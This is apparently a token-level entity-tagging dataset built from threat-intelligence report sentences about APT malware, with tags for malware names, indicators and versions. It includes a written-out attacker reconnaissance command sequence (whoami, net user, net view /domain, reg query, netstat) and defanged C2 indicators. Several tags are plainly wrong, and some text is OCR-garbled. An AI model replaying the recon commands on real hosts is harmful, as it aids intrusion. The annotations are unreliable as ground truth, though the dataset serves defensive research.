whenever	O
the	O
user	O
clicks	O
,	O
to	O
execute	O
arbitrary	O
code	O
.	O

Figure	O
3	O
:	O
Printable	O
strings	O
refer	O
to	O
www.google.com.hk	B-Indicator
Figure	O
4	O
:	O
References	O
to	O
Chopper	O
in	O
the	O
client	O
binary	O

Fancybear.net	O
.	O
'	O

There	O
was	O
no	O
indication	O
that	O
the	O
attack	O
was	O
successful	O
,	O
but	O
Chafer	O
did	O
successfully	O
in ltrate	O
an	O
African	O
airline	O
that	O
is	O
a	O
customer	O
of	O
the	O
reservations	O
 rm	O
.	O

Derived	O
from	O
the	O
class	O
,	O
the	O
class	O
's	O
operations	O
are	O
focused	O
largely	O
in	O
the	O
ProcessPacket	O
and	O
ReadWaitingData	O

The	O
'	O
Payment	O
Invoice.jar	O
'	O
malware	O
was	O
sent	O
in	O
a	O
phishing	O
email	O
that	O
contained	O
some	O
of	O
the	O
following	O
details	O
:	O
The	O
'	O
INV#94586.jar	B-Malware
'	O
malware	O
was	O
sent	O
in	O
a	O
phishing	O
email	O
that	O
contained	O
some	O
of	O
the	O
following	O
details	O
:	O

We	O
assess	O
with	O
moderate	O
confidence	O
that	O
the	O
attacker	O
was	O
developing	O
the	O
capability	O
to	O
cause	O
physical	O
damage	O
and	O
inadvertently	O
shutdown	O
operations	O
.	O

Dec	O
6th	B-Version
2011	O

Format	O
String	O
Example/Explanation	O

Naval	O
Science	O
Curriculum	O
2014.doc	O
1.doc	B-Version
Republic	O
Day	O
speech	O
27	O
Jan	O
2014.doc	O

But	O
Zebrocy	O
efforts	O
are	O
in	O
such	O
high	O
volume	O
,	O
that	O
these	O
modules	O
need	O
examination	O
as	O
well	O
.	O

The	O
reason	O
why	O
the	O
CERT	O
Analysis	O
Team	O
of	O
ANTIY	B-Organization
classified	O
APT-TOCS	B-Malware
into	O
APT	O
incidents	O
is	O
that	O
it	O
's	O
a	O
kind	O
of	O
targeted	O
attack	O
(	O
one	O
of	O
the	O
features	O
of	O
APT	O
attack	O
)	O
,	O
it	O
has	O
anti-detection	O
functions	O
and	O
also	O
it	O
can	O
conceal	O
itself	O
.	O

These	O
details	O
are	O
then	O
used	O
to	O
delete	O
specific	O
transactions	O
,	O
or	O
update	O
transaction	O
amounts	O
appearing	O
in	O
balance	O
reporting	O
messages	O
based	O
on	O
the	O
amount	O
of	O
Convertible	O
Currency	O
available	O
in	O
specific	O
accounts	O
.	O

Since	O
the	O
establishment	O
in	O
December	O
,	O
2014	O
,	O
the	O
team	O
has	O
successflly	O
integrated	O
360	O
's	O
big	O
data	O
base	O
and	O
built	O
up	O
a	O
quick	O
reversing	O
and	O
corellation	O
procudure	O
.	O

The	O
above	O
screenshot	O
illustrates	O
a	O
REconTM	O
trace	O
on	O
the	O
malware	O
dropper	O
and	O
subsequent	O
service	O
creation	O
.	O

On	O
reboot	O
was	O
now	O
happy	O
to	O
load	O
the	O
backdoor	O
and	O
get	O
down	O
to	O
business	O
;	O
this	O
technique	O
is	O
known	O
as	O
dll	O
search	O
order	O
hijacking	O
or	O
binary	O
planting	O
.	O

It	O
is	O
recommended	O
to	O
make	O
sure	O
that	O
the	O
hosts	O
you	O
use	O
are	O
not	O
accessing	O
these	O
URLs	O
.	O

Most	O
security	O
software	O
runs	O
in	O
the	O
background	O
so	O
it	O
may	O
be	O
that	O
users	O
have	O
become	O
more	O
willing	O
to	O
run	O
security	O
software	O
because	O
they	O
know	O
they	O
need	O
it	O
despite	O
that	O
they	O
do	O
n't	O
know	O
what	O
it	O
actually	O
does	O
or	O
how	O
it	O
is	O
supposed	O
to	O
work	O
,	O
just	O
that	O
it	O
is	O
supposed	O
to	O
protect	O
them	O
.	O

To	O
distribute	O
the	O
malicious	O
excel	O
file	O
,	O
the	O
attackers	O
registered	O
a	O
domain	O
which	O
impersonated	O
the	O
identity	O
of	O
most	O
influential	O
Indian	O
think	O
tank	O
IDSA	O
(	O
Institute	O
for	O
Defence	O
Studies	O
and	O
Analyses	O
)	O
and	O
used	O
the	O
email	O
id	O
from	O
the	O
impersonating	O
domain	O
to	O
send	O
out	O
the	O
spear-phishing	O
emails	O
to	O
the	O
victims	O
.	O

The	O
code	O
does	O
not	O
look	O
malicious—just	O
odd	O
.	O

Thus	O
,	O
we	O
will	O
focus	O
our	O
analysis	O
on	O
the	O
function	O
that	O
contains	O
the	O
backdoor	O
code	O
named	O

However	O
,	O
on	O
the	O
first	O
launch	O
,	O
the	O
collected	O
user	O
information	O
is	O
saved	O
into	O
'	O
xmlrwbin.inc	O
'	O
.	O

When	O
the	O
victim	O
opens	O
the	O
attached	O
word	O
document	O
it	O
prompts	O
the	O
user	O
to	O
enable	O
macro	O
content	O
and	O
both	O
the	O
documents	O
(	O
Uri	O
Terror	O
Report.doc	O
and	O
mha-report.doc	O
)	O
displayed	O
the	O
same	O
content	O
and	O
contained	O
a	O
Show	O
Document	O
button	O
as	O
shown	O
below	O
In	O
case	O
of	O
both	O
the	O
documents	O
(	O
Uri	O
Terror	O
Report.doc	O
and	O
mha-report.doc	O
)	O
the	O
malicious	O
macro	O
code	O
was	O
heavily	O
obfuscated	O
(	O
used	O
obscure	O
variable/function	O
names	O
to	O
make	O
analysis	O
harder	O
)	O
and	O
did	O
not	O
contain	O
any	O
auto	O
execute	O
functions.Malicious	O
activity	O
is	O
trigged	O
only	O
on	O
user	O
interaction	O
,	O
attackers	O
normally	O
use	O
this	O
technique	O
to	O
bypass	O
sandbox/automated	O
analysis	O
.	O

But	O
the	O
storage	O
type	O
of	O
lIlIIl	O
is	O
string	O
,	O
so	O
only	O
by	O
modifying	O
the	O
data	O
type	O
to	O
0x200C	O
,	O
i.e.	O
VT_VARIANT	O
|	O
VT_ARRAY	O
(	O
array	O
type	O
)	O
,	O
attackers	O
can	O
achieve	O
their	O
purpose	O
.	O

The	O
correct	O
VBR	O
will	O
likely	O
be	O
the	O
one	O
with	O
information	O
filled	O
in	O
from	O
offset	O
10	B-Version
–	O
80	O
(	O
See	O
Figure	O
2	O
to	O
breakdown	O
)	O
.	O

DHS	O
encourages	O
network	O
administrators	O
to	O
implement	O
the	O
recommendations	O
below	O
,	O
which	O
can	O
prevent	O
as	O
many	O
as	O
85	O
percent	O
of	O
targeted	O
cyber-attacks	O
.	O

DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS	O

CROWDSTRIKE	O
INTELLIGENCE	O
HAS	O
ASSESSED	O
THAT	O
THE	O
DISTRIBUTION	O
OF	O
THE	O
MALICIOUS	O
APPLICATION	O
TARGETED	O
THE	O
VERY	O
ARTILLERY	O
UNITS	O
FOR	O
WHICH	O
THE	O
BENIGN	O
APPLICATION	O
WAS	O
DEVELOPED—BRIGADES	O
OPERATING	O
IN	O
EASTERN	O
UKRAINE	O
ON	O
THE	O
FRONTLINES	O
OF	O
THE	O
CONFLICT	O
WITH	O
RUSSIAN-BACKED	O
SEPARATIST	O
FORCES	O
DURINGTHE	O
EARLY	O
STAGES	O
OF	O
THE	O
CONFLICT	O
IN	O
LATE-2014	O
.	O

'	O
Cyber	O
Security	O
Update	O
:	O
WADA	O
's	O
Incident	O
Response	O
.	O
'	O

6939	O
-	O
HURRICANE	O
-	O
Hurricane	O
Electric	O
,	O
Inc	O
.	O

This	O
document	O
can	O
not	O
be	O
modified	O
or	O
converted	O
to	O
any	O
other	O
electronic	O
or	O
machine-readable	O
form	O
in	O
whole	O
or	O
in	O
part	O
without	O
prior	O
written	O
approval	O
of	O
Fidelis	O
Cybersecurity	O
,	O
Inc	O
.	O

Mem	O
members	O
of	O
2	O
classes	O
created	O
by	O
UAF	O
are	O
offset	O
by	O
0x0c	B-Version
bytes	O
,	O
and	O
an	O
array	O
of	O
0x7fffffff	O
size	O
is	O
forged	O
by	O
reading	O
and	O
writing	O
operation	O
to	O
the	O
two	O
mem	O
members	O
.	O

downloader	O
-	O
>	O
hta	O
checkin	O
-	O
>	O
info	O
stealer	O
-	O
>	O
more	O
compiled	O
components	O
.	O

No	O
parties	O
in	O
Libya	O
before	O
this	O
analysis	O
reported	O
to	O
use	O
cyber	O
attacks	O
,	O
malwares	O
nor	O
recruit	O
hackers	O
to	O
spy	O
on	O
their	O
rivals	O
.	O

InitialDelay	O
:	O
00000000	O
DWORD	O

What	O
's	O
New	O
in	O
Ramallah	O
?	O

cc9e6578a47182a941a478b276320e06	O
Summary	O
:	O
This	O
earlier	O
SPLM	B-Malware
variant	O
found	O
on	O
the	O
DNC	O
network	O
in	O
2016	O
still	O
maintains	O
the	O
internal	O
name	O
'	O
splm.dll	O
'	O
,	O
with	O
only	O
one	O
export	O
'	O
init	O
'	O
that	O
was	O
called	O
at	O
runtime	O
.	O

SPLM	B-Malware
64-bit	I-Malware
modules	I-Malware
already	O
appeared	O
to	O
be	O
at	O
version	O
4	O
of	O
the	O
software	O
by	O
May	O
of	O
the	O
year	O
.	O

Figure	O
23	O
:	O
A	O
packet	O
capture	O
shows	O
that	O
the	O
Web	B-Malware
shell	O
traffic	O
is	O
HTTP	O
POST	O
traffic	O
over	O
TCP	O
port	O
80	O

(	O
909125d1de7ac584c15f81a34262846f	B-Indicator
)	O
Some	O
samples	O
had	O
two	O
hardcoded	O
command	O
and	O
control	O
servers	O
:	O
iecrs[.]co	O
and	O
iecr[.]co	O
(	O
note	O
once	O
again	O
the	O
use	O
of	O
IEC	O
in	O
the	O
domain	O
name	O
)	O
.	O

Below	O
is	O
the	O
description	O
of	O
the	O
strings	O
passed	O
in	O
the	O
C2	O
communication	O

Thu	O
Jun	O
14	O
2012	O
12:31:34	O
52719	O
mac	O
.	O

In	O
particular	O
,	O
in	O
November	O
2011	O
Laura	O
Aylward	O
of	O
Contextis	O
published	O
an	O
excellent	O
analysis	O
[	O
http://www.contextis.com/research/blog/darkcometrat/	B-Indicator
]	O
of	O
Dark	B-Malware
Comet	I-Malware
in	O
which	O
she	O
described	O
the	O
basic	O
cryptographic	O
mechanism	O
used	O
by	O
DarkComet	B-Malware
bots	O
to	O
hide	O
their	O
communications	O
;	O
Laura	O
's	O
analysis	O
saved	O
us	O
a	O
considerable	O
amount	O
of	O
time	O
.	O

It	O
will	O
then	O
retry	O
the	O
connection	O
with	O
the	O
next	O
remote	O
host	O
,	O
if	O
there	O
is	O
one	O
.	O

38	O
.	O

brou.com[.]uy	B-Indicator
(	O
currently	O
clean	O
)	O

This	O
opaque	O
information	O
complicates	O
the	O
analysis	O
a	O
little	O
bit	O
,	O
but	O
it	O
is	O
still	O
possible	O
to	O
obtain	O
interesting	O
results	O
.	O

Finally	O
,	O
the	O
trojan	O
Import	O
Address	O
Table	O
(	O
IAT	O
)	O
is	O
resolved	O
and	O
the	O
file	O
path	O
of	O
the	O
process	O
that	O
hosts	O
the	O
dll	O
is	O
resolved	O
and	O
saved	O
in	O
a	O
global	O
variable	O
.	O

SPLM	B-Malware
,	O
GAMEFISH	O
,	O
and	O
Zebrocy	O
delivery	O
all	O
maintain	O
their	O
own	O
clusters	O
,	O
but	O
frequently	O
overlap	O
later	O
.	O

When	O
a	O
web	O
shell	O
is	O
hosted	O
on	O
an	O
internet	O
facing	O
victim	O
system	O
,	O
an	O
adversary	O
can	O
remotely	O
access	O
the	O
system	O
to	O
perform	O
malicious	O
actions	O
.	O

Once	O
an	O
infected	O
machine	O
connects	O
,	O
you	O
see	O
its	O
information	O
displayed	O
in	O
a	O
selection	O
box	O
at	O
the	O
top	O
.	O

The	O
following	O
actionable	O
intelligence	O
can	O
be	O
used	O
to	O
identify	O
exploit	O
remnants	O
in	O
the	O
heap	O
space	O
of	O
Internet	B-System
Explorer	B-Version
post	O
exploitation	O
attempt	O
.	O

Record	O
#	O
1	O
Length	O
:	O
96	O
bytes	O
:	O

The	O
technique	O
is	O
described	O
here	O
.	O

The	O
campaign	O
targeted	O
only	O
a	O
few	O
select	O
devices	O
(	O
13	O
)	O
that	O
are	O
all	O
located	O
in	O
India	O
.	O

The	O
larger	O
,	O
300kb+	O
SPLM	B-Malware
backdoors	O
deployed	O
in	O
2016	O
and	O
2017	O
are	O
not	O
observed	O
any	O
longer	O
at	O
targets	O
in	O
2018	O
.	O

Advanced	O
malware	O
bypasses	O
these	O
defenses	O
by	O
employing	O
techniques	O
such	O
as	O
dynamic	O
botnet	O
obfuscation	O
,	O
network	O
based	O
fragmentation	O
and	O
session	O
splicing	O
,	O
application	O
or	O
protocol	O
violations	O
,	O
disabling	O
intrusion	O
detection	O
systems	O
(	O
IDSs	O
)	O
,	O
to	O
more	O
advanced	O
techniques	O
such	O
as	O
encryption	O
and	O
code	O
reuse	O
attacks.Carefully	O
crafted	O
exploits	O
can	O
avoid	O
even	O
advanced	O
heuristic	O
detection	O
algorithms	O
used	O
in	O
today	O
's	O
antivirus	O
software	O
.	O

Alternatively	O
,	O
this	O
string	O
can	O
be	O
replaced	O
by	O
'	O
@	O
boot	O
'	O
for	O
a	O
command	O
to	O
run	O
at	O
each	O
startup	O
–	O
whereas	O
some	O
Unix	O
cron	O
implementations	O
accept	O
'	O
@	O
reboot	O
'	O
.	O

Second	O
,	O
the	O
attacker	O
must	O
have	O
performed	O
OT	O
reconnaissance	O
and	O
have	O
sufficient	O
specialized	O
engineering	O
knowledge	O
to	O
understand	O
the	O
industrial	O
process	O
being	O
controlled	O
and	O
successfully	O
manipulate	O
it	O
.	O

Password	O
the	O
attached	O
document	O
:	O
cbr	O
'	O

Our	O
forensics	O
endeavor	O
revealed	O
a	O
number	O
of	O
indicators	O
that	O
made	O
us	O
think	O
XAgent	B-Malware
was	O
distributed	O
via	O
Komplex	O
malware	O
:	O

Russia	O
,	O
like	O
many	O
nations	O
,	O
has	O
long	O
viewed	O
success	O
in	O
the	O
Olympic	O
Games	O
as	O
a	O
source	O
of	O
national	O
prestige	O
and	O
soft	O
power	O
on	O
the	O
world	O
stage	O
.	O

Code	O
execution	O
does	O
not	O
use	O
the	O
traditional	O
ROP	O
or	O
GodMod	O
,	O
but	O
through	O
the	O
script	O
layout	O
Shellcode	O
to	O
stabilize	O
the	O
use	O
.	O

Babar	B-Malware
supports	O
trampoline	O
functions	O
for	O
a	O
limited	O
list	O
of	O
APIs	O
and	O
limited	O
to	O
a	O
set	O
of	O
processes	O
of	O
interest	O
,	O
defined	O
by	O
its	O
configuration	O
.	O

COM	B-Indicator
,	O
appeared	O
to	O
be	O
a	O
fake	O
version	O
of	O
CBIUAE.COM	B-Indicator
,	O
the	O
actual	O
domain	O
of	O
the	O
website	O
of	O
Commercial	O
Bank	O
International	O
of	O
the	O
United	O
Arab	O
Emirates	O
.	O

This	O
Tiny	B-Malware
Meterpreter	I-Malware
backdoor	O
dropped	O
two	O
different	O
malware	O
families	O
:	O
Win32/Spy.Sekur	O
–	O
well	O
known	O
malware	O
used	O
by	O
the	O
Carbanak	B-Malware
gang	O
Win32/Wemosis	B-Malware
–	O
a	O
PoS	O
RAM	O
Scraper	O
backdoor	O
As	O
mentioned	O
here	O
by	O
our	O
colleagues	O
from	O
TrendMicro	O
,	O
Carbanak	B-Malware
malware	O
is	O
capable	O
of	O
targeting	O
Epicor/NSB	O
PoS	O
systems	O
,	O
while	O
Win32/Wemosis	B-Malware
is	O
a	O
general-purpose	O
PoS	O
RAM	O
Scraper	O
which	O
targets	O
any	O
PoS	O
that	O
stores	O
card	O
data	O
in	O
the	O
memory	O
.	O

Business	O
–	O
photographic	O
studio	O
Industrial	O
enterprise	O
,	O
construction	O
company	O
Door	O
manufacturing	O

In	O
this	O
attack	O
,	O
which	O
we	O
first	O
observed	O
in	O
the	O
second	O
week	O
of	O
June	O
,	O
the	O
potential	O
victim	O
is	O
encouraged	O
to	O
visit	O
a	O
download	O
link	O
containing	O
a	O
malicious	O
installer	O
of	O
Freegate	B-Malware
.	O

중앙관리	O
솔루션	O
공격은	O
크게	O
관리	O
서버	O
계정을	O
이용한	O
공격과	O
클라이언트	O
에이전	O
트	O
취약점을	O
이용한	O
공격으로	O
구분할	O
수	O
있다	O
.	O

Because	O
the	O
function	O
is	O
excessively	O
used	O
and	O
encoded	O
gibberish	O
strings	O
are	O
always	O
passed	O
to	O
it	O
,	O
we	O
can	O
be	O
confident	O
that	O
the	O
function	O
is	O
truly	O
a	O
string	O
decoder	O
.	O

Player	O
5	O
has	O
entered	O
the	O
game	O
....	O

Furthermore	O
,	O
the	O
samples	O
at	O
hand	O
show	O
the	O
same	O
partial	O
API	O
name	O
obfuscation	O
as	O
Bunny	B-Malware
and	O
TFC	O
.	O

Nevertheless	O
,	O
we	O
can	O
reveal	O
some	O
screenshots	O
of	O
the	O
administration	O
panel	O
which	O
are	O
available	O
on	O
the	O
underground	O
.	O

An	O
FLV	O
file	O
is	O
an	O
interesting	O
choice	O
of	O
decoy	O
document	O
since	O
it	O
is	O
not	O
a	O
standard	O
video	O
format	O
for	O
media	O
players	O
.	O

cmd.exe	O
/c	O
hostname	O
cmd.exe	O
/c	O
whoami	O
cmd.exe	O
/c	O
ver	O
cmd.exe	O
/c	O
ipconfig	O
-all	B-Version
cmd.exe	O
/c	O
ping	O
www.google.com	B-Indicator
cmd.exe	O
/c	O
query	O
user	O
cmd.exe	O
/c	O
net	O
user	O
cmd.exe	O
/c	O
net	O
view	O
cmd.exe	O
/c	O
net	O
view	O
/domain	O
cmd.exe	O
/c	O
reg	O
query	O
'	O
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet	O
Settings	O
'	O
cmd.exe	O
/c	O
tasklist	O
/svc	O
cmd.exe	O
/c	O
netstat	O
-ano	O
|	O
find	O
'	O
TCP	O
'	O

Image	O
3	O
.	O

Additionally	O
,	O
while	O
the	O
overlap	O
with	O
Appin	O
exists	O
,	O
the	O
fact	O
that	O
domains	O
used	O
the	O
same	O
IP	O
at	O
the	O
same	O
time	O
is	O
insufficient	O
for	O
concrete	O
attribution	O
.	O

1/19/2017	O
In	O
my	O
previous	B-Version
blog	O
I	O
posted	O
details	O
of	O
a	O
cyber	O
attack	O
targeting	O
Indian	O
government	O
organizations	O
.	O

The	O
MuddyWater	O
campaign	O
was	O
first	O
sighted	O
in	O
2017	O
when	O
it	O
targeted	O
the	O
Saudi	O
government	O
using	O
an	O
attack	O
involving	O
PowerShell	O
scripts	O
deployed	O
via	O
Microsoft	O
Office	O
Word	O
macro	O
.	O

The	O
Framework	O
provides	O
standards	O
,	O
guidelines	O
,	O
and	O
practices	O
that	O
are	O
working	O
effectively	O
today	O
.	O

This	O
is	O
often	O
the	O
case	O
in	O
this	O
type	O
of	O
large-scale	O
cyber	O
espionage	O
operations	O
.	O

The	O
core	O
export	O
functions	O
are	O
AccessDebugTracer	B-Indicator
and	O
AccessRetailTracer	B-Indicator
.	O

These	O
samples	O
are	O
then	O
stored	O
for	O
further	O
analysis	O
.	O

We	O
are	O
referring	O
to	O
these	O
campaigns	O
as	O
Metamorfo	B-Malware
.	O

These	O
attacks	O
require	O
more	O
'	O
steps	O
'	O
to	O
reach	O
their	O
ultimate	O
target	O
,	O
which	O
adds	O
additional	O
time	O
and	O
risk	O
for	O
attackers	O
to	O
reach	O
their	O
targets	O
.	O

We	O
estimate	O
that	O
it	O
served	O
malware	O
.	O

The	O
latest	O
known	O
sample	O
in	O
this	O
campaign	O
(	O
7ceac3389a5c97a3008aae9a270c706a	B-Indicator
)	O
has	O
compilation	O
timestamp	O
of	O
February	O
12	O
,	O
2017	O
.	O

PowerShell	O
command	O
started	O
major	O
local	O
PowerShell	O
;	O
updated	O
build.sh	O
tool	O
.	O

It	O
also	O
starts	O
a	O
thread	O
that	O
retrieves	O
the	O
current	O
foreground	O
window	O
handle	O
every	O
100	O
milliseconds	O
.	O

Whilst	O
macanna.com[.]tw	B-Indicator
appears	O
to	O
be	O
a	O
legitimate	O
site	O
,	O
it	O
has	O
also	O
been	O
observed	O
as	O
being	O
a	O
command	O
and	O
control	O
destination	O
for	O
malware	O
.	O

이러한	O
중앙관리	O
솔루션의	O
역할은	O
주로	O
네트워크접근제어	O
(	O
NAC	O
)	O
,	O
백신	O
(	O
Anti-virus	O
)	O
,	O
소프트웨어	O
및	O
하드웨어	O
자산	O
,	O
소프트웨어	O
패치	O
(	O
PMS	O
)	O
관리	O
등이며	O
,	O
대개	O
IT	O
자산	O
관리	O
,	O
보고서	O
생성	O
,	O
소프트웨어	O
배포	O
,	O
원격제어	O
등의	O
기능을	O
제공한다	O
.	O

This	O
functionality	O
is	O
triggered	O
by	O
making	O
a	O
request	O
to	O
either	O
JobTcp1.php	O
or	O
JobTcp2.php	O
,	O
if	O
the	O
C2	O
response	O
satisfies	O
the	O
condition	O
then	O
it	O
gets	O
the	O
executable	O
content	O
from	O
a	O
hard	O
coded	O
IP	O
address	O
.	O

java	B-System
khobe	O

First	O
Seen	O
:	O

The	O
malware	O
was	O
delivered	O
as	O
a	O
Py2EXE	O
compiled	O
python	O
script	O
dependent	O
on	O
a	O
zip	O
file	O
containing	O
standard	O
Python	O
libraries	O
,	O
open	O
source	O
libraries	O
,	O
as	O
well	O
as	O
the	O
attacker-developed	O
Triconex	B-Malware
attack	O
framework	O
for	O
interacting	O
with	O
the	O
Triconex	B-Malware
controllers	O
.	O

The	O
core	O
part	O
of	O
APT-TOCS	B-Malware
relies	O
on	O
the	O
encrypted	O
data	O
scripts	O
(	O
hereinafter	O
referred	O
to	O
as	O
Sample	O
B	O
)	O
downloaded	O
by	O
PowerShell	O
.	O

Command	O

POSSIBLE	O
ATTACKER	O
SUPPLY	O
CHAIN	O
OR	O
TRAINING	O
REGIMEN	O

DLL	B-Malware
hijacking	O
is	O
a	O
technique	O
used	O
by	O
some	O
APT	O
malware	O
in	O
which	O
instead	O
of	O
the	O
legitimate	O
application	O
(	O
.exe	O
)	O
loading	O
the	O
benign	O
DLL	O
,	O
the	O
application	O
is	O
tricked	O
into	O
loading	O
a	O
DLL	O
containing	O
malicious	O
code	O
.	O

The	O
following	O
is	O
a	O
screenshot	O
of	O
the	O
email	O
:	O
The	O
'	O
Hold-transactions-pdf.jar/verification-docx.jar	B-Malware
'	O
malware	O
beaconed	O
to	O
'	O
184.22.201[.]27	B-Malware
'	O
over	O
port	O

With	O
services	O
that	O
include	O
strategy	O
and	O
risk	O
management	O
,	O
cyber	O
defense	O
,	O
digital	O
identity	O
,	O
application	O
security	O
and	O
managed	O
security	O
,	O
Accenture	O
enables	O
businesses	O
around	O
the	O
world	O
to	O
defend	O
against	O
known	O
sophisticated	O
threats	O
,	O
and	O
the	O
unknown	O
.	O

The	O
group	O
has	O
been	O
conducting	O
long-term	O
monitoring	O
on	O
the	O
targets	O
to	O
stole	O
confidential	O
data	O
.	O

Following	O
the	O
Green	O
Revolution	O
,	O
the	O
Iranian	O
government	O
considered	O
adding	O
a	O
formal	O
offensive	O
cyber	O
component	O
to	O
its	O
existing	O
intelligence	O
apparatus	O
,	O
and	O
was	O
forced	O
to	O
address	O
a	O
personnel	O
problem	O
.	O

This	O
post	O
was	O
authored	O
by	O
Mariano	O
Graziano	O
.	O

Compromising	O
both	O
the	O
DCS	O
and	O
SIS	O
system	O
would	O
enable	O
the	O
attacker	O
to	O
develop	O
and	O
carry	O
out	O
an	O
attack	O
that	O
causes	O
the	O
maximum	O
amount	O
of	O
damage	O
allowed	O
by	O
the	O
physical	O
and	O
mechanical	O
safeguards	O
in	O
place	O
.	O

'	O
Microsoft	B-Organization
Security	O
Advisory	O
(	O
2269637	O
)	O
:	O
Insecure	O
Library	O
Loading	O
Could	O
Allow	O
Remote	O
Code	O
Execution	O
'	O
Last	O
accessed	O
August	O
30	O
,	O
2013.	O
http://technet.microsoft.com/en-us/security/advisory/2269637	O
http://msdn.microsoft.com/en-us/library/windows/desktop/dd407288	O
(	O
v=vs.85	O
)	O
.aspx	O
Microsoft	O
.	O

29	O
Dec	O
.	O

Since	O
at	O
least	O
2009	O
,	O
the	O
Islamic	O
Republic	O
of	O
Iran	O
has	O
regularly	O
responded	O
to	O
sanctions	O
or	O
perceived	O
provocations	O
by	O
conducting	O
offensive	O
cyber	O
campaigns	O
.	O

Globalization	O
has	O
woven	O
the	O
Internet	O
into	O
a	O
fabric	O
that	O
interlaces	O
practically	O
every	O
aspect	O
of	O
modern	O
living	O
.	O

The	O
dropper	O
will	O
decode	O
this	O
DLL	O
from	O
its	O
resource	O
section	O
,	O
drop	O
it	O
onto	O
the	O
victim	O
's	O
system	O
,	O
and	O
proceed	O
to	O
fill	O
its	O
resource	O
section	O
with	O
randomly	O
generated	O
data	O
.	O

When	O
the	O
user	O
opens	O
the	O
document	O
DDEAUTO	O
or	O
Link	O
Auto	O
Update	O
,	O
Office	O
will	O
display	O
a	O
message	O
.	O

The	O
following	O
factors	O
in	O
this	O
cyber	O
attack	O
suggests	O
the	O
possible	O
involvement	O
of	O
Pakistan	O
state	O
sponsored	O
cyber	O
espionage	O
group	O
to	O
spy	O
or	O
to	O
take	O
control	O
of	O
the	O
systems	O
of	O
the	O
officials	O
of	O
Central	O
Bureau	O
of	O
Investigation	O
(	O
CBI	O
)	O
and	O
officials	O
of	O
the	O
Indian	O
Army	O
.	O

File	O
Name	O
:	O
d9821468315ccd3b9ea03161566ef18e.dll	O
File	O
Size	O
:	O
28672	O
bytes	O
MD5	O
:	O
SHA1	O
:	O
PE	O
Time	O
:	O
PEID	O
Sig	O
:	O
Sections	O
(	O
5	O
)	O
:	O
Name	O
.text	O
.rdata	O
.data	O
.rsrc	O
.reloc	O
ee6cde0fdae9bfa6c18b3783a23d0952	B-Indicator
886f6f3780467a511ae909d20390df5b	B-Indicator
54d7948676ee96b2f9e0a141598b564d	B-Indicator
e5665b3b3ffbbfcd5f2cbf31677fcbf9	B-Indicator
c1cea8dced657cfc85b045a2421417f1	B-Indicator
Entropy	O
6.48	O
4.77	O
1.16	O
5.55	O
4.64	O

The	O
discovery	O
of	O
the	O
XAgent	O
module	O
once	O
again	O
reasserts	O
the	O
need	O
for	O
organizations	O
to	O
tackle	O
computer	O
security	O
in	O
a	O
unified	O
manner	O
,	O
regardless	O
of	O
the	O
operating	O
system	O
mix	O
they	O
have	O
deployed	O
.	O

This	O
technique	O
allows	O
the	O
attackers	O
to	O
validate	O
if	O
they	O
are	O
connecting	O
to	O
the	O
correct	O
C2	O
server	O
and	O
also	O
this	O
technique	O
does	O
not	O
reveal	O
any	O
malicious	O
behavior	O
in	O
dynamic/sandbox	O
analysis	O
until	O
the	O
correct	O
response	O
is	O
given	O
to	O
the	O
malware	O
.	O

Sri	O
Lankan	O
police	O
have	O
since	O
arrested	O
another	O
individual	O
and	O
a	O
further	O
suspect	O
is	O
wanted	O
by	O
Sri	O
Lankan	O
law	O
enforcement	O
.	O

Web	O
.	O

With	O
the	O
command	O
line	O
patched	O
and	O
authority	O
verified	O
,	O
the	O
server	O
variant	O
sleeps	O
for	O
5	O
seconds	O
before	O
verifying	O
that	O
the	O
fShutdown	O
flag	O
is	O
not	O
set	O
.	O

When	O
the	O
recipient	O
of	O
the	O
email	O
opens	O
the	O
attached	O
excel	O
file	O
it	O
prompts	O
the	O
user	O
to	O
enable	O
macro	O
content	O
and	O
the	O
excel	O
also	O
contains	O
instruction	O
on	O
how	O
to	O
enable	O
the	O
macros	O
.	O

Persistence	O
:	O

For	O
example	O
,	O
the	O
value	O
reported	O
after	O
successful	O
retrieval	O
of	O
the	O
first	O
stage	O
is	O
'	O
0-0-0	O
'	O
.	O

File	O
/	O
Process	O
name	O
bitsran.exe	B-Malware

A	O
scientific	O
research	O
institute	O
.	O

The	O
code	O
is	O
specifically	O
crafted	O
to	O
look	O
for	O
a	O
user-created	O
DLL	O
communicating	O
with	O
the	O
Siemens	B-Organization
PLCSIM	O
environment	O
.	O

The	O
most	O
common	O
example	O
is	O
SQL	O
injection	O
,	O
which	O
subverts	O
the	O
relationship	O
between	O
a	O
webpage	O
and	O
its	O
supporting	O
database	O
,	O
typically	O
to	O
obtain	O
information	O
contained	O
inside	O
the	O
database	O
.	O

CTU	O
researchers	O
have	O
not	O
observed	O
TG-4127	B-Malware
use	O
this	O
technique	O
(	O
using	O
Bitly	O
short	O
links	O
)	O
to	O
target	O
the	O
U.S.	O
Republican	O
party	O
or	O
the	O
other	O
U.S.	O
presidential	O
candidates	O
whose	O
campaigns	O
were	O
active	O
between	O
mid-March	O
and	O
mid-May	O
:	O
Donald	O
Trump	O
,	O
Bernie	O
Sanders	O
,	O
Ted	O
Cruz	O
,	O
Marco	O
Rubio	O
,	O
and	O
John	O
Kasich	O
.	O

'	O
Russia	O
'	O
was	O
Behind	O
German	O
Parliament	O
Hack	O
.	O
'	O
'	O

The	O
backdoor	O
contains	O
identical	O
exports	O
as	O
well	O
as	O
an	O
additional	O
dummy	O
function	O
from	O
the	O
legitimate	O
called	O
'	O
StartWork	O
'	O
which	O
can	O
be	O
used	O
to	O
reliably	O
identify	O
similar	O
samples	O
.	O

The	O
DLL	O
then	O
reads	O
this	O
file	O
,	O
and	O
decrypts	O
it	O
with	O
a	O
running	O
XOR	O
mask	O
.	O

2016	O
.	O

Sample	O
A.	O
UCL	O
decompression	O
Sample	O
B	O
Sample	O
B	O
execution	O
Update	O
on	O
Jul	O
03	O
2014	O
:	O
F-Secure	B-Organization
released	O
an	O
analysis	O
of	O
the	O
latest	O
MiniDuke	B-Malware
evolution	O
,	O
called	O
'	O
CosmicDuke	B-Malware
'	O
,	O
mentioning	O
similar	O
loaders	O
in	O
old	O
and	O
new	O
samples	O
.	O

For	O
investigators	O
to	O
trace	O
an	O
attack	O
,	O
each	O
stage	O
will	O
have	O
be	O
uncovered	O
and	O
referenced	O
to	O
the	O
other	O
stages	O
.	O

When	O
we	O
count	O
all	O
systems	O
from	O
2016	O
infected	O
with	O
any	O
one	O
of	O
the	O
StrongPity	B-System
components	O
or	O
a	O
dropper	O
,	O
we	O
see	O
